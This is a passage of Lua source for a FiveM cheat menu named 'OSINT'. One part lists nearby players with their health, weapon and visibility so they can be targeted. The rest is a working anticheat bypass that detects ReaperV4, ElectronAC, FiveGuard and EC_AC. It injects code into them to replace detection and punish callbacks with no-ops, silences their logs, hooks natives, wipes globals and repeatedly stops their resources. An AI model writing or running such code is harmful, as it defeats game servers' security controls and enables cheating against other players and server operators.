                        OSINT:Notify(data.checked and "success" or "error", "OSINT", ("You have %s %s!"):format(data.checked and "enabled" or "disabled", data.label), 3000)

                        if IsVisible then
                            OSINT:UpdateElements(CurrentMenu)
                        end
                    end
                end
            end
        end
    end
end)

function OSINT:InListMenu()
    return CurrentCategories and CurrentCategories[CurrentCategoryIndex] and (CurrentCategories[CurrentCategoryIndex].label == "List" or CurrentCategories[CurrentCategoryIndex].label == "Safe")
end

function OSINT:SelectEveryone()
    if not CurrentCategories or not CurrentCategories[CurrentCategoryIndex] then return end
    local category = CurrentCategories[CurrentCategoryIndex]
    if category.label ~= "List" then return end

    for i, tab in ipairs(category.tabs) do
        if tab.type == "checkbox" then
            tab.checked = true
            if tab.serverId and tonumber(tab.serverId) then
                CPlayers[tonumber(tab.serverId)] = true
            end
        end
    end

    self:UpdateElements(CurrentMenu)
end

function OSINT:UnselectEveryone()
    if not CurrentCategories or not CurrentCategories[CurrentCategoryIndex] then return end
    local category = CurrentCategories[CurrentCategoryIndex]
    if category.label ~= "List" then return end

    for i, tab in ipairs(category.tabs) do
        if tab.type == "checkbox" then
            tab.checked = false
            if tab.serverId and tonumber(tab.serverId) then
                CPlayers[tonumber(tab.serverId)] = false
            end
        end
    end

    self:UpdateElements(CurrentMenu)
end

function OSINT:ClearSelection()
    CPlayers = {}
    if CurrentCategories and CurrentCategories[CurrentCategoryIndex] then
        local category = CurrentCategories[CurrentCategoryIndex]
        if category.label == "List" and category.tabs then
            for _, tab in ipairs(category.tabs) do
                if tab.type == "checkbox" then
                    tab.checked = false
                end
            end
        end
    end

    OSINT:UnselectEveryone()
end

function OSINT:UpdateListMenu()
    if not IsVisible then return end
    if not CurrentCategories or not CurrentCategories[CurrentCategoryIndex] then return end
    local category = CurrentCategories[CurrentCategoryIndex]
    if category.label ~= "List" then return end

    local coords = GetEntityCoords(PlayerPedId())
    if not coords then return end

    local nearbyPlayers = self:GetNearbyPlayers(coords, 350.0, true)
    local dividerIndex
    for i, tab in ipairs(category.tabs) do
        if tab.type == "divider" and tab.label == "Nearby Players" then
            dividerIndex = i
            break
        end
    end
    if not dividerIndex then return end

    for i = #category.tabs, dividerIndex + 1, -1 do
        table.remove(category.tabs, i)
    end

    if #nearbyPlayers == 0 then
        category.tabs[#category.tabs + 1] = {
            type = "button",
            label = "No Nearby Players",
            disabled = true
        }
    else
        table.sort(nearbyPlayers, function(a, b) return tonumber(a.serverId) < tonumber(b.serverId) end)
        for _, player in ipairs(nearbyPlayers) do
            local sid = tonumber(player.serverId)
            if sid and player.name then
                local _, currentWeapon = GetCurrentPedWeapon(GetPlayerPed(GetPlayerFromServerId(sid)))
                category.tabs[#category.tabs + 1] = {
                    type = "checkbox",
                    label = ("%s - [%s]"):format(player.name, sid),
                    serverId = sid,
                    checked = CPlayers[sid] or false,
                    name = player.name,
                    vehicle = GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))) ~= 0 and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))) or nil,
                    isDriver = GetPedInVehicleSeat(GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))) ~= 0 and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))), -1) == GetPlayerPed(GetPlayerFromServerId(sid)) or false,
                    metaData = {
                        { key = "Distance", value = math.floor(#(GetEntityCoords(PlayerPedId()) - GetEntityCoords(GetPlayerPed(GetPlayerFromServerId(sid))))) .. ".0m" },
                        { key = "Server ID", value = sid },
                        { key = "Health", value = GetEntityHealth(GetPlayerPed(GetPlayerFromServerId(sid))), color = "0, 255, 17" },
                        { key = "Armour", value = GetPedArmour(GetPlayerPed(GetPlayerFromServerId(sid))), color = "0, 132, 255" },
                        { key = "Weapon", value = WeaponsLabels[currentWeapon] or "Unknown" },
                        { key = "Vehicle", value = GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))) ~= 0 and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))) or "Unknown" },
                        { key = "Alive", value = IsPedDeadOrDying(GetPlayerPed(GetPlayerFromServerId(sid))) and "Dead" or "Alive" },
                        { key = "Speed", value = math.floor(GetEntitySpeed(GetPlayerPed(GetPlayerFromServerId(sid))) * 3.6) .. ".0 km/h" },
                        { key = "Visible", value = IsEntityVisibleToScript(GetPlayerPed(GetPlayerFromServerId(sid))) and "Visible" or "Invisible" },
                    },
                    onSelect = function(checked)
                        CPlayers[sid] = checked or false
                    end
                }
            end
        end
    end

    for serverId, _ in pairs(CPlayers) do
        local stillNearby = false
        for _, player in ipairs(nearbyPlayers) do
            if tonumber(player.serverId) == tonumber(serverId) then
                stillNearby = true
                break
            end
        end
        if not stillNearby then
            CPlayers[serverId] = nil
        end
    end

    HoveredIndex = math.min(HoveredIndex or 1, math.max(1, #category.tabs))

    local ok, err = pcall(function()
        self:UpdateElements(CurrentMenu)
    end)
    if not ok then
        print("^7[^5OSINT^7]: UI update error: " .. tostring(err))
    end
end

function OSINT:AssignListMenuActions()
    if not ActiveMenu then return end

    for _, subMenu in ipairs(ActiveMenu) do
        if subMenu.label == "Server" and subMenu.categories then
            for _, category in ipairs(subMenu.categories) do
                if category.label == "List" and category.tabs then
                    for _, tab in ipairs(category.tabs) do
                        if tab.type == "button" then
                            if tab.label == "Select Everyone" then
                                tab.onSelect = function() OSINT:SelectEveryone() end
                            elseif tab.label == "Un-Select Everyone" then
                                tab.onSelect = function() OSINT:UnselectEveryone() end
                            elseif tab.label == "Clear Selection" then
                                tab.onSelect = function() OSINT:ClearSelection() end
                            end
                        end
                    end
                end
            end
        end
    end
end

CreateThread(function()
    while true do
        Wait(1500)
        if OSINT:InListMenu() and IsVisible then
            local ok, err = pcall(function()
                OSINT:UpdateListMenu()
            end)
            if not ok then
                print("^7[^5OSINT^7]: List update error: " .. tostring(err))
            end
        end
    end
end)

Wait(1000)

OSINT:AssignListMenuActions()

local electronResource = nil
local fiveguardResource = nil

local function ScanElectronAnticheat()
    for i = 0, GetNumResources() - 1 do
        local resource = GetResourceByFindIndex(i)
        local manifest = LoadResourceFile(resource, "fxmanifest.lua")
        if manifest and (string.find(manifest, "https://electron-services.com") or string.find(manifest, "Electron Services") or string.find(manifest, "The most advanced fiveM anticheat")) then
            electronResource = resource
            print("^7[^5OSINT^7]: Detected ElectronAC in Resource: " .. resource)
            return resource
        end
    end

    return nil
end

local function ScanFiveGuardAnticheat()
    for i = 0, GetNumResources() - 1 do
        local resource = GetResourceByFindIndex(i)
        local files = GetNumResourceMetadata(resource, 'client_script')
        for j = 0, files - 1 do
            local metadata = GetResourceMetadata(resource, 'client_script', j)
            if metadata and string.find(metadata, "obfuscated") then
                fiveguardResource = resource
                print("^7[^5OSINT^7]: Detected FiveGuard in Resource: " .. resource)
                return resource
            end
        end
    end
    
    return nil
end

function OSINT:LoadBypass()
    local restrictedIPs = {
        "216.146.24.88:30120",
        "91.190.154.74:30120"
    }
    local currentEndpoint = GetCurrentServerEndpoint()
    for _, ip in ipairs(restrictedIPs) do
        if currentEndpoint == ip then
            self:Notify("error", "OSINT", "Bypass disabled for this server.", 3000)
            return
        end
    end

    self:Notify("info", "OSINT", "Loading Anticheat Bypass...", 3000)
    ScanElectronAnticheat()
    ScanFiveGuardAnticheat()
    Wait(1000)

    -- ReaperV4 Bypass
    if GetResourceState("ReaperV4") == "started" then
        MachoInjectResource2(2, "ReaperV4", [[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local reaper_newdetection
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "Reaper:NewDetection" then
                        reaper_newdetection = func
                    end
                end
                if type(reaper_newdetection) ~= "function" then
                    return print("error")
                end
                local _, securityclient = debug.getupvalue(reaper_newdetection, 1)
                for name, detection in pairs(securityclient["detections"]) do
                    if detection["detected"] then
                        securityclient["detections"][name]["detected"] = function(...)
                            local args = { ... }
                            print(name, "detected", json.encode(args or {}))
                            return
                        end
                    end
                    if detection["callback"] then
                        securityclient["detections"][name]["callback"] = function(...)
                            local args = { ... }
                            print(name, "callback", json.encode(args or {}))
                            return
                        end
                    end
                end
                for name, detection in pairs(securityclient["active_detections"]) do
                    if detection["detected"] then
                        securityclient["active_detections"][name]["detected"] = function(...) return end
                    end
                    if detection["callback"] then
                        securityclient["active_detections"][name]["callback"] = function(...) return end
                    end
                end
                Debug.setupvalue(reaper_newdetection, 1, securityclient)
                print("ReaperV4 | Client Bypassed")
            end)
        ]])

    MachoHookNative(0xC6D3D26810C8E0F9, function(...) return false, false end)
    MachoHookNative(0x8D4D46230B2C353A, function(...) return false, 3 end)
    MachoHookNative(0xB15162CB5826E9E8, function(...) return false, true end)
    MachoHookNative(0xD5037BA82E12416F, function(...) return false, 0 end)
    MachoHookNative(0xFB92A102F1C4DFA3, function(...) return false, true end)
    print("ReaperV4 Bypass Enabled")
    self:Notify("info", "OSINT", "ReaperV4 Bypass Loaded", 3000)

    elseif electronResource ~= nil then
        Injection("ElectronAC", [[
            print = function() end
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (string.find(msg, "DEBUG") or string.find(msg, "NEWDBG") or string.find(msg, "A11AXXX") or string.find(msg, "function") or string.find(msg, "TriggerServerEvent")) then
                    originalTrace(msg)
                end
            end
        ]])
        MachoInjectResource2(2, "ElectronAC", [[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local eAcVerify
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "ElectronAC.verify" then
                        local upname, func = debug.getupvalue(func, 1)
                        eAcVerify = func
                    end
                end
                local EACTable = nil
                local eacUpvalueIndex = nil
                local i = 1
                while true do
                    local name, value = debug.getupvalue(eAcVerify, i)
                    if not name then break end
                    if type(value) == "table" then
                        local hasEACStructure = false
                        for idx, tbl in pairs(value) do
                            if type(tbl) == "string" then
                                if tbl == "antiNuiBlocker" or tbl == "antiInvisible" then
                                    hasEACStructure = true
                                end
                                if hasEACStructure then break end
                            end
                        end
                        if hasEACStructure then
                            EACTable = value
                            eacUpvalueIndex = i
                            break
                        end
                    end
                    i = i + 1
                end
                if not EACTable then
                    print("EAC table not found!")
                    return
                end
                local punish = function(...) return end
                for idx, tbl in pairs(EACTable) do
                    if type(tbl) == "table" then
                        for subIdx, subTbl in pairs(tbl) do
                            if type(subTbl) == "table" and type(subTbl["punish"]) == "function" and subTbl["punish"] then
                                subTbl["punish"] = punish
                            end
                        end
                    end
                end
                Debug.setupvalue(eAcVerify, eacUpvalueIndex, EACTable)
                print("ElectronAC | Client Bypassed")
            end)
        ]])

    elseif fiveguardResource ~= nil then
        CreateThread(function()
            while true do
                MachoResourceStop(fiveguardResource)
                print("^7[^5OSINT^7]: Stopped Resource: " .. fiveguardResource)
                Wait(2000)
            end
        end)
        return

    elseif GetResourceState("EC_AC") == "started" then
        MachoInjectResourceRaw("EC_AC", [[print = function() end]])
        MachoInjectResourceRaw("EC_AC", [[
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (
                    string.find(msg, "DEBUG") or
                    string.find(msg, "NEWDBG") or
                    string.find(msg, "A11AXXX") or
                    string.find(msg, "function") or
                    string.find(msg, "TriggerServerEvent")
                ) then
                    originalTrace(msg)
                end
            end
        ]])
        local resources = { "EC_AC" }
        for i = 1, #resources do
            local resource = resources[i]
            MachoInjectResource(resource, [[
                print(GetCurrentResourceName())
                for name, func in pairs(_G) do
                    if name == "TriggerEvent" then return end
                    _G[name] = nil
                    print(name, func)
                end
            ]])
            Wait(1050)
        end
        CreateThread(function()
            while true do
                Wait(0)
                MachoResourceStop("EC_AC")
            end
        end)
    end

    if GetResourceState("WaveShield") == 'started' then
        OSINT:Notify("error", "OSINT", "WaveShield Anticheat Found.", 3000)
    elseif GetResourceState("ReaperV4") == 'started' then
        OSINT:Notify("error", "OSINT", "ReaperV4 Anticheat Found.", 3000)
    elseif GetResourceState("ElectronAC") == 'started' then
        OSINT:Notify("error", "OSINT", "ElectronAC Anticheat Found.", 3000)
    elseif GetResourceState("FiniAC") == 'started' then
        OSINT:Notify("error", "OSINT", "FiniAC Anticheat Found.", 3000)
    end
end

Wait(500)
OSINT:LoadBypass()